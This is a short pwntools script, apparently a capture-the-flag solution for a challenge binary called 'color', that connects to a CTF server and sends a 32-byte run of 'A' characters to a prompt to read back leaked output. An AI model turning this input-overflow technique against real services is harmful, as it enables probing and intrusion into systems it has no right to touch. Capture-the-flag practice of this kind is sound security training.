#!/usr/bin/env python3

from pwn import *

exe = ELF("./color")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.pwnoh.io", 13370)

    return r


def main():
    r = conn()

    r.sendlineafter(b'color? ', b'A'*0x20)

    log.info(r.recvline())


if __name__ == "__main__":
    main()
